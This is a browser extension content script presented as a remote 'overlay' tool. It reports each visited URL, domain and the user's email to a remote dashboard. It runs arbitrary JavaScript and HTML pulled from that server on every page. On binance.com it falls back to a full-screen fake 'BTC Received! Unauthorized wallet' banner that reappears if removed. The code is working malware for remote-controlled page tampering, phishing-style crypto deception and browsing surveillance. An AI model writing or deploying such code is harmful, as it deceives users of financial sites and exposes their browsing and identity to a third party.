(function () {
  "use strict";

  // Prevent multiple initializations on the same document
  if (window.__remoteOverlayInitialized) return;
  window.__remoteOverlayInitialized = true;

  const currentDomain = window.location.hostname;
  const currentUrl = window.location.href;

  const DEFAULT_API_URL = "https://extension-dashboard-eight.vercel.app";
  const CANDIDATE_API_URLS = [
    "https://extension-dashboard-eight.vercel.app",
    "http://localhost:3001",
    "http://localhost:3000",
  ];
  const CACHE_KEY_PREFIX = "remote_overlay_cache_";
  const CACHE_TIME = 2 * 60 * 1000; // 2 minutes

  // Fallback defaults for Binance if remote backend is completely down
  const binanceFallbackDefaults = {
    enabled: true,
    height: "50",
    bg: "#0b0e11",
    text: "#eaecef",
    titleColor: "#f0b90b",
    title: "BTC Received!",
    message: 'Status: <span style="color:#848e9c;">pending</span><br>Unauthorized wallet.',
    customCss: "",
    customJs: "",
  };

  let activeConfig = null;

  async function getStoredSettings() {
    return new Promise((resolve) => {
      chrome.storage.local.get(["apiBaseUrl", "clientId", "userEmail"], (res) => {
        let clientId = res.clientId;
        if (!clientId) {
          clientId = "client_" + Math.random().toString(36).substring(2, 10);
          chrome.storage.local.set({ clientId });
        }
        resolve({
          apiBaseUrl: (res.apiBaseUrl || DEFAULT_API_URL).replace(/\/+$/, ""),
          clientId: clientId,
          userEmail: res.userEmail || "",
          isDefaultUrl: !res.apiBaseUrl,
        });
      });
    });
  }

  async function sendHeartbeat(apiUrl, clientId, userEmail) {
    try {
      await fetch(`${apiUrl}/api/client/heartbeat`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          clientId,
          email: userEmail,
          domain: currentDomain,
          currentUrl: currentUrl,
        }),
      });
    } catch (e) {
      // Heartbeat silent fail
    }
  }

  async function fetchRemoteOverlay(apiUrl, clientId, isDefaultUrl) {
    const targetUrls = isDefaultUrl
      ? [apiUrl, ...CANDIDATE_API_URLS.filter((u) => u !== apiUrl)]
      : [apiUrl];

    let lastError = null;

    for (const baseUrl of targetUrls) {
      try {
        const url = `${baseUrl}/api/overlay?domain=${encodeURIComponent(currentDomain)}&clientId=${encodeURIComponent(clientId)}`;
        const response = await fetch(url, {
          method: "GET",
          headers: { "Accept": "application/json" },
        });

        if (response.ok) {
          const data = await response.json();
          if (isDefaultUrl && baseUrl !== apiUrl) {
            chrome.storage.local.set({ apiBaseUrl: baseUrl });
          }
          return { data, workingUrl: baseUrl };
        }
      } catch (err) {
        lastError = err;
      }
    }

    throw lastError || new Error("Failed to reach API");
  }

  function applyCustomCss(css) {
    document.getElementById("custom-remote-overlay-css")?.remove();
    if (!css || !css.trim()) return;

    try {
      const styleEl = document.createElement("style");
      styleEl.id = "custom-remote-overlay-css";
      styleEl.textContent = css;
      (document.head || document.documentElement).appendChild(styleEl);
    } catch (e) {
      console.warn("[RemoteOverlay] Failed to inject custom CSS", e);
    }
  }

  function executeCustomJs(jsCode, cfg, popupEl) {
    if (!jsCode || !jsCode.trim()) return;

    try {
      const fn = new Function("context", `
        try {
          ${jsCode}
        } catch (err) {
          console.error("[RemoteOverlay Custom JS Error]:", err);
        }
      `);

      fn({
        domain: currentDomain,
        url: currentUrl,
        config: cfg,
        popup: popupEl,
        close: () => popupEl.remove(),
      });
    } catch (e) {
      console.error("[RemoteOverlay] Failed to compile custom JS", e);
    }
  }

  function applyOverlay(cfg) {
    // If explicitly disabled, remove popup
    if (!cfg || cfg.enabled === false) {
      document.getElementById("custom-sticky-popup")?.remove();
      document.getElementById("custom-remote-overlay-css")?.remove();
      activeConfig = null;
      return;
    }

    activeConfig = cfg;

    // Apply custom CSS if provided
    if (cfg.customCss) {
      applyCustomCss(cfg.customCss);
    }

    // Remove existing popup if already rendered to replace with fresh styles
    document.getElementById("custom-sticky-popup")?.remove();

    const popup = document.createElement("div");
    popup.id = "custom-sticky-popup";

    const heightVal = cfg.height ? `${cfg.height}vh` : "50vh";

    Object.assign(popup.style, {
      position: "fixed",
      top: "0",
      left: "0",
      width: "100%",
      height: heightVal,
      background: cfg.bg || "#0b0e11",
      borderBottom: "2px solid #333",
      color: cfg.text || "#eaecef",
      fontFamily: "Arial, sans-serif",
      display: "flex",
      flexDirection: "column",
      justifyContent: "center",
      alignItems: "center",
      boxShadow: "0 6px 25px rgba(0,0,0,0.4)",
      boxSizing: "border-box",
      padding: "20px 40px",
    });

    // Highest possible z-index
    popup.style.setProperty("z-index", "2147483647", "important");

    // Close button
    if (cfg.closable !== false) {
      const closeBtn = document.createElement("div");
      closeBtn.innerHTML = "&#x2715;";
      Object.assign(closeBtn.style, {
        position: "absolute",
        top: "20px",
        right: "30px",
        cursor: "pointer",
        fontSize: "24px",
        color: cfg.text || "#eaecef",
        opacity: "0.7",
        lineHeight: "1",
        userSelect: "none",
        transition: "opacity 0.2s",
      });
      closeBtn.onmouseover = () => (closeBtn.style.opacity = "1");
      closeBtn.onmouseout = () => (closeBtn.style.opacity = "0.7");
      closeBtn.onclick = () => {
        popup.remove();
        activeConfig = null;
      };
      popup.appendChild(closeBtn);
    }

    // Title
    if (cfg.title) {
      const title = document.createElement("div");
      title.innerText = cfg.title;
      Object.assign(title.style, {
        fontSize: "44px",
        fontWeight: "bold",
        color: cfg.titleColor || "#f0b90b",
        marginBottom: "20px",
        textAlign: "center",
        lineHeight: "1.2",
      });
      popup.appendChild(title);
    }

    // Message
    if (cfg.message) {
      const message = document.createElement("div");
      message.innerHTML = cfg.message;
      Object.assign(message.style, {
        fontSize: "22px",
        lineHeight: "1.6",
        textAlign: "center",
        maxWidth: "800px",
      });
      popup.appendChild(message);
    }

    // Safely append to DOM
    function mount() {
      if (!document.getElementById("custom-sticky-popup")) {
        const parent = document.body || document.documentElement;
        if (parent) {
          parent.appendChild(popup);
        }
      }
    }

    if (document.body || document.documentElement) {
      mount();
    } else {
      document.addEventListener("DOMContentLoaded", mount);
    }

    // Execute custom JS if provided
    if (cfg.customJs) {
      executeCustomJs(cfg.customJs, cfg, popup);
    }
  }

  async function syncOverlay(force = false) {
    const { apiBaseUrl, clientId, userEmail, isDefaultUrl } = await getStoredSettings();

    const cacheKey = CACHE_KEY_PREFIX + currentDomain;

    if (!force) {
      const cached = await new Promise((res) => {
        chrome.storage.local.get(cacheKey, (data) => res(data[cacheKey]));
      });

      if (cached && cached.data && Date.now() - cached.time < CACHE_TIME) {
        if (cached.data.matched && cached.data.overlay) {
          const isEnabled = cached.data.rule ? cached.data.rule.enabled !== false : true;
          applyOverlay({ ...cached.data.overlay, enabled: isEnabled });
        }
        sendHeartbeat(apiBaseUrl, clientId, userEmail);
        return;
      }
    }

    try {
      const { data, workingUrl } = await fetchRemoteOverlay(apiBaseUrl, clientId, isDefaultUrl);

      chrome.storage.local.set({
        [cacheKey]: { data: data, time: Date.now() },
      });

      sendHeartbeat(workingUrl, clientId, userEmail);

      if (data.matched && data.overlay) {
        // Fix: resolve enabled status from rule or overlay
        const isEnabled = data.rule ? data.rule.enabled !== false : (data.overlay.enabled !== false);
        if (isEnabled) {
          applyOverlay({
            ...data.overlay,
            enabled: true,
          });
        } else {
          applyOverlay({ enabled: false });
        }
      } else {
        document.getElementById("custom-sticky-popup")?.remove();
        document.getElementById("custom-remote-overlay-css")?.remove();
      }
    } catch (err) {
      console.warn("[RemoteOverlay] API fetch error, checking cache/defaults.", err);

      chrome.storage.local.get(cacheKey, (result) => {
        const cached = result[cacheKey];
        if (cached && cached.data && cached.data.overlay) {
          const isEnabled = cached.data.rule ? cached.data.rule.enabled !== false : true;
          applyOverlay({ ...cached.data.overlay, enabled: isEnabled });
        } else if (currentDomain.includes("binance.com")) {
          applyOverlay(binanceFallbackDefaults);
        }
      });
    }
  }

  // Periodic safeguard: ensure popup remains visible if SPA re-renders body
  setInterval(() => {
    if (activeConfig && activeConfig.enabled !== false) {
      if (!document.getElementById("custom-sticky-popup")) {
        applyOverlay(activeConfig);
      }
    }
  }, 2000);

  chrome.runtime.onMessage.addListener((message) => {
    if (message.action === "refresh_overlay") {
      syncOverlay(true);
    } else if (message.action === "background_poll") {
      syncOverlay(false);
    }
  });

  syncOverlay(false);
})();
